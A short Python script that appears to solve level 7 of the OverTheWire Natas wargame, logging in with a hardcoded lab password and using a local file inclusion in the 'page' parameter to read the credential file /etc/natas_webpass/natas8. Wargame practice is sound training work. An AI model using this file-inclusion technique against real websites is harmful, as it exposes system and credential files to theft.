import requests
import re

# level 6 => 7

Username = "natas7"
Password = "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9"

session = requests.session()
url = "http://{}.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8".format(Username) 

response = session.post(url,auth=(Username,Password))

content = response.text



#print(content)
flag = re.findall('<br>\n(.*)\n\n<!--',content)[0]
print(flag)